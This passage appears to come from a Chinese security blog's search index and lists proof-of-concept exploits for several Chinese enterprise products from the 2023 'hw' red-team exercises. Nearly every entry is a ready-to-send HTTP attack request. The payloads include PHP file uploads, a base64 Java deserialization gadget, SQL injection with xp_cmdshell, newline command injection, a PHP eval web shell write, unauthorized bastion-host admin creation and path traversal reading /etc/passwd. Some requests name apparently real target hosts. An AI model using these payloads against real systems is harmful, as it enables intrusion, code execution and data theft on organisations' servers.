Gecko) Chrome/115.0.0.0 Safari/537.36 Content-Type: multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: currentmoduleId=; prevcurrentmoduleId=; ASP.NET_SessionId=dwgpzkmpqdwkgfefjcwxzr4f; __RequestVerificationToken=MuLUdOygmXaoLwVszqtimhifsVREHIu-alcI9SLBiM617s7kK1M1El1pgO6fm5yIs1_PU NSX-ZQAfk0baq_6cA6RGMPKc5K87XTsMDG2bSs1 Connection: close ------WebKitFormBoundaryxzUhGld6cusN3Alk Content-Disposition: form-data; name=\"file\"; filename=\"test.grf.aspx\" Content-Type: application/octet-stream 1112 ------WebKitFormBoundaryxzUhGld6cusN3Alk-- ","date":"2023-12-08","objectID":"/%E6%98%93%E6%80%9D%E8%BD%AF%E4%BB%B6-%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F-importreport-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["2023hw"],"title":"易思软件-智能物流无人值守系统 ImportReport 任意文件上传","uri":"/%E6%98%93%E6%80%9D%E8%BD%AF%E4%BB%B6-%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F-importreport-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw"],"content":"```\rdetail: ID: 4877 Author: 玄道 Name: 普元EOS中间件存在命令注入漏洞 Description: Primeton EOS是上海普元信息技术有限责任公司自主研发的面向构件的中间件，是基于J2EE之上的面向构件的完整的互联网应用体系。 Primeton EOS产品提供了对构件在定义、组装、发布、运行、管理、访问等多方面的全方位支持和完善服务，形成了一套完整的构件体系。普元EOS中间件存在命令注入漏洞，攻击者可执行命令。 Identifier: DVB: DVB-2023-4877 VulnClass: 远程命令执行 Category: Web服务器集群 Manufacturer: 普元EOS Product: 普元EOS Type: 1 Status: 1 Scanable: 1 Level: 4 DisclosureDate: ‘2023-08-09’ VulnImpact: 严重 Region: 中国大陆 Is0day: false IncludeExp: true Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=“普元”||(body=“ame.primeton.com”\u0026\u0026body=“eos-web”) Solutions: 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: false get_variables: baseDATA: base64Decode(“rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3Ijt/kQAhlemwIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHEAfgAETAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAAAAAAAAB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAD/PK/rq+AAAAMQDjAQAub3JnL2FwYWNoZS9jb3lvdGUvdGFnbGliL2NvcmUvQ29udmVydGVySW1wbFRhZwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlDAAFAAYKAAQACQEAAXEBADMoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdleGVjQ21kDAANAAwKAAIADgEACDxjbGluaXQ+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwARAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAEwEAE2phdmEvbGFuZy9FeGNlcHRpb24HABUBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXAHABcBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHABkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAGwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAB0BABBqYXZhL2xhbmcvVGhyZWFkBwAfAQAQamF2YS9sYW5nL1N0cmluZwcAIQEADmphdmEvdXRpbC9MaXN0BwAjAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HACUBAA1TdGFja01hcFRhYmxlAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAAoACkKACAAKgEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwwALAAtCgAgAC4BABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DAAwADEKACAAMgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwANAA1CgAEADYBAAd0aHJlYWRzCAA4AQAPamF2YS9sYW5nL0NsYXNzBwA6AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAPAA9CgA7AD4BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAQABBCgAcAEIBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwARABFCgAcAEYBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsMAEgASQoAIABKAQAEZXhlYwgATAEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABOAE8KACIAUAEABGh0dHAIAFIBAAZ0YXJnZXQIAFQBABJqYXZhL2xhbmcvUnVubmFibGUHAFYBAAZ0aGlzJDAIAFgBAAdoYW5kbGVyCABaAQANZ2V0U3VwZXJjbGFzcwwAXAA1CgA7AF0BAAZnbG9iYWwIAF8BAApwcm9jZXNzb3JzCABhAQAEc2l6ZQEAAygpSQwAYwBkCwAkAGUBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAEQAZwsAJABoAQADcmVxCABqAQALZ2V0UmVzcG9uc2UIAGwBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DABuAG8KADsAcAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAcgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAdAB1CgBzAHYBAAlnZXRIZWFkZXIIAHgBAApDTURfSEVBREVSAQASTGphdmEvbGFuZy9TdHJpbmc7DAB6AHsJAAIAfAEAB2lzRW1wdHkBAAMoKVoMAH4AfwoAIgCAAQAJc2V0U3RhdHVzCACCAQARamF2YS9sYW5nL0ludGVnZXIHAIQBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAIYAhwkAhQCIAQAEKEkpVgwABQCKCgCFAIsMAAsADAoAAgCNAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCACPAQAHZm9yTmFtZQEAPShMamF2YS9sYW5nL1N0cmluZztaTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsMAJEAkgoAOwCTAQALbm","date":"2023-12-08","objectID":"/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"普元EOS中间件存在命令注入漏洞","uri":"/%E6%99%AE%E5%85%83eos%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"智跃人力资源管理系统GenerateEntityFromTable.aspx SQL漏洞 ","date":"2023-12-08","objectID":"/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgenerateentityfromtable.aspx-sql%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"智跃人力资源管理系统GenerateEntityFromTable.aspx SQL漏洞","uri":"/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgenerateentityfromtable.aspx-sql%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"ZY-人力资源管理系统\" ","date":"2023-12-08","objectID":"/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgenerateentityfromtable.aspx-sql%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"智跃人力资源管理系统GenerateEntityFromTable.aspx SQL漏洞","uri":"/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgenerateentityfromtable.aspx-sql%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc http://127.0.0.1:8085/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select+@@version))%2B%27 ","date":"2023-12-08","objectID":"/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgenerateentityfromtable.aspx-sql%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"智跃人力资源管理系统GenerateEntityFromTable.aspx SQL漏洞","uri":"/%E6%99%BA%E8%B7%83%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgenerateentityfromtable.aspx-sql%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## poc\rhttps://ztfxcx.ztf520.com/LKT/images/1692345411200.php POST /LKT/index.php?module=api\u0026action=product\u0026m=t_comment HTTP/1.1 User-Agent: Opera/8.55.(Windows NT 5.01; ky-KG) Presto/2.9.162 Version/12.00 Accept-Encoding: gzip, deflate Accept: */* Connection: close Host: ztfxcx.ztf520.com:443 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymtWcHjwCbo2qE3Zi Content-Length: 295 ------WebKitFormBoundarymtWcHjwCbo2qE3Zi Content-Disposition: form-data; name=\"imgFile\";filename=\"0Ujz2.php\" Content-Type:image/php \u003c?php phpinfo(); ------WebKitFormBoundarymtWcHjwCbo2qE3Zi Content-Disposition: form-data; name=\"type\"; file ------WebKitFormBoundarymtWcHjwCbo2qE3Zi-- ","date":"2023-12-08","objectID":"/%E6%9D%A5%E5%AE%A2%E7%94%B5%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-t_comment-%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"来客电商管理系统 t_comment 存在文件上传漏洞","uri":"/%E6%9D%A5%E5%AE%A2%E7%94%B5%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-t_comment-%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某x服应用交付系统命令执行漏洞 POST /rep/login Host:127.0.0.1:85 clsMode=cls_mode_login%0Als%0A\u0026index=index\u0026log_type=report\u0026loginType=account\u0026page=login\u0026rnd=0\u0026userID=admin\u0026userPsw=123 ","date":"2023-12-08","objectID":"/%E6%9F%90x%E6%9C%8D%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某x服应用交付系统命令执行漏洞","uri":"/%E6%9F%90x%E6%9C%8D%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某信景云终端安全管理系统 login SQL注入漏洞 POST /api/user/login captcha=\u0026password=21232f297a57a5a743894a0e4a801fc3\u0026username=admin'and(select*from(select+sleep(3))a)=' ","date":"2023-12-08","objectID":"/%E6%9F%90%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某信景云终端安全管理系统 login SQL注入漏洞 ","uri":"/%E6%9F%90%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某凌OA前台代码执行 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: www.ynjd.cn:801 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1) Accept: / Connection: Keep-Alive Content-Length: 42 Content-Type: application/x-www-form-urlencoded var={\"body\":{\"file\":\"file:///etc/passwd\"}} var={“body”:{“file”:“file:///etc/passwd”}} // linux var={“body”:{“file”:\"/WEB-INF/KnssConfig/admin.properties\"}} //windows ","date":"2023-12-08","objectID":"/%E6%9F%90%E5%87%8Coa%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:1:0","tags":["2023hw漏洞"],"title":"某凌OA前台代码执行","uri":"/%E6%9F%90%E5%87%8Coa%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":["2023hw漏洞"],"content":"某友时空KSOA PayBill SQL注入漏洞 POST /servlet/PayBill?caculate\u0026_rnd= HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 134 Accept-Encoding: gzip, deflate Connection: close \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e\u003croot\u003e\u003cname\u003e1\u003c/name\u003e\u003cname\u003e1'WAITFOR DELAY '00:00:03';-\u003c/name\u003e\u003cname\u003e1\u003c/name\u003e\u003cname\u003e102360\u003c/name\u003e\u003c/root\u003e ","date":"2023-12-08","objectID":"/%E6%9F%90%E5%8F%8B%E6%97%B6%E7%A9%BAksoa-paybill-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某友时空KSOA PayBill SQL注入漏洞","uri":"/%E6%9F%90%E5%8F%8B%E6%97%B6%E7%A9%BAksoa-paybill-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某和OA C6-GetSqlData.aspx SQL注入漏洞 OST /C6/Control/GetSqlData.aspx/.ashx Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36 Connection: close Content-Length: 189 Content-Type: text/plain Accept-Encoding: gzip exec master..xp_cmdshell 'ipconfig' ","date":"2023-12-08","objectID":"/%E6%9F%90%E5%92%8Coa-c6-getsqldata.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某和OA C6-GetSqlData.aspx SQL注入漏洞","uri":"/%E6%9F%90%E5%92%8Coa-c6-getsqldata.aspx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某微 E-Cology 某版本 SQL注入漏洞 POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36 Connection: close Content-Length: 189 Content-Type: text/plain Accept-Encoding: gzip callCount=1 page= httpSessionId= scriptSessionId= c0-scriptName=DocDwrUtil c0-methodName=ifNewsCheckOutByCurrentUser c0-id=0 c0-param0=string:1 AND 1=1 c0-param1=string:1 batchId=0 ","date":"2023-12-08","objectID":"/%E6%9F%90%E5%BE%AE-e-cology-%E6%9F%90%E7%89%88%E6%9C%AC-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某微 E-Cology 某版本 SQL注入漏洞","uri":"/%E6%9F%90%E5%BE%AE-e-cology-%E6%9F%90%E7%89%88%E6%9C%AC-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某微E-Office9文件上传漏洞 CVE-2023-2523 POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1 Host:192.168.233.10:8082 Cache-Control:max-age=0 Upgrade-Insecure-Requests:1 Origin:null Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt Accept-Encoding:gzip, deflate Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Connection:close ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt Content-Disposition:form-data; name=\"upload_quwan\"; filename=\"1.php.\" Content-Type:image/jpeg \u003c?phpphpinfo();?\u003e ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt ","date":"2023-12-08","objectID":"/%E6%9F%90%E5%BE%AEe-office9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2523/:1:0","tags":["2023hw漏洞"],"title":"某微E-Office9文件上传漏洞 CVE-2023-2523","uri":"/%E6%9F%90%E5%BE%AEe-office9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2523/"},{"categories":["2023hw漏洞"],"content":"某微E-Office9文件上传漏洞 CVE-2023-2648 POST /inc/jquery/uploadify/uploadify.php HTTP/1.1 Host: 192.168.233.10:8082 User-Agent: test Connection: close Content-Length: 493 Accept-Encoding: gzip Content-Type: multipart/form-data ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt Content-Disposition: form-data; name=\"Filedata\"; filename=\"666.php\" Content-Type: application/octet-stream \u003c?php phpinfo();?\u003e ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt ","date":"2023-12-08","objectID":"/%E6%9F%90%E5%BE%AEe-office9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2648/:1:0","tags":["2023hw漏洞"],"title":"某微E-Office9文件上传漏洞 CVE-2023-2648","uri":"/%E6%9F%90%E5%BE%AEe-office9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-2648/"},{"categories":["2023hw漏洞"],"content":"某恒明御运维审计与风险控制系统堡垒机任意用户注册 POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1 Host: xxx Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 1121 \u003c?xml version=\"1.0\"?\u003e \u003cmethodCall\u003e \u003cmethodName\u003eweb.user_add\u003c/methodName\u003e \u003cparams\u003e \u003cparam\u003e \u003cvalue\u003e \u003carray\u003e \u003cdata\u003e \u003cvalue\u003e \u003cstring\u003eadmin\u003c/string\u003e \u003c/value\u003e \u003cvalue\u003e \u003cstring\u003e5\u003c/string\u003e \u003c/value\u003e \u003cvalue\u003e \u003cstring\u003eXX.XX.XX.XX\u003c/string\u003e \u003c/value\u003e \u003c/data\u003e \u003c/array\u003e \u003c/value\u003e \u003c/param\u003e \u003cparam\u003e \u003cvalue\u003e \u003cstruct\u003e \u003cmember\u003e \u003cname\u003euname\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003edeptadmin\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003ename\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003edeptadmin\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003epwd\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003eDeptadmin@123\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eauthmode\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e1\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003edeptid\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eemail\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003emobile\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003ecomment\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003cmember\u003e \u003cname\u003eroleid\u003c/name\u003e \u003cvalue\u003e \u003cstring\u003e101\u003c/string\u003e \u003c/value\u003e \u003c/member\u003e \u003c/struct\u003e\u003c/value\u003e \u003c/param\u003e \u003c/params\u003e \u003c/methodCall\u003e ","date":"2023-12-08","objectID":"/%E6%9F%90%E6%81%92%E6%98%8E%E5%BE%A1%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某恒明御漏洞","uri":"/%E6%9F%90%E6%81%92%E6%98%8E%E5%BE%A1%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"安恒明御安全网关rce GET /webui/?g=aaa_portal_auth_local_submit\u0026bkg_flag=0\u0026$type=1\u0026suffix=1|echo+\" \u003c%3fphpteval(\\$_POST[\\\"a\\\"]) ;?\u003e\"+\u003e+.xxx.php HTTP/1.1 Host: xxx Cookie: USGSESSID=495b895ddd42b82cd89a29f241825081 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close shell：http://xxxx/webui/.xxx.php ","date":"2023-12-08","objectID":"/%E6%9F%90%E6%81%92%E6%98%8E%E5%BE%A1%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"某恒明御漏洞","uri":"/%E6%9F%90%E6%81%92%E6%98%8E%E5%BE%A1%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"明御 SQL注入： /caztbweb/VisitorWeb/VisitorWeb_XMLHTTPaspx?ParentCode=1' ","date":"2023-12-08","objectID":"/%E6%9F%90%E6%81%92%E6%98%8E%E5%BE%A1%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"某恒明御漏洞","uri":"/%E6%9F%90%E6%81%92%E6%98%8E%E5%BE%A1%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某服 sxf-报表系统命令执行漏洞 POST /rep/login HTTP/1.1 Host: URL Cookie: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 Accept-Encoding: gzip deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers Connection: close Content-Type:application/x-www-form-urlencoded Content-Length: 126 clsMode=cls_mode_login\u0026index=index\u0026log_type=report\u0026page=login\u0026rnd=0.7550103466497915\u0026userID=admin%0Aid -a %0A\u0026userPsw=tmbhuisq ","date":"2023-12-08","objectID":"/%E6%9F%90%E6%9C%8D-sxf-%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某服 sxf-报表系统命令执行漏洞","uri":"/%E6%9F%90%E6%9C%8D-sxf-%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某盟 SAS堡垒机 local_user.php 任意用户登录漏洞 GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php\u0026method=login\u0026user_account=admin HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"某盟 SAS堡垒机 local_user.php 任意用户登录漏洞","uri":"/%E6%9F%90%E7%9B%9F-sas%E5%A0%A1%E5%9E%92%E6%9C%BA-local_user.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"某盟 SAS堡垒机 local_user.php 任意用户登录漏洞 GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php\u0026method=login\u0026user_account=admin HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) 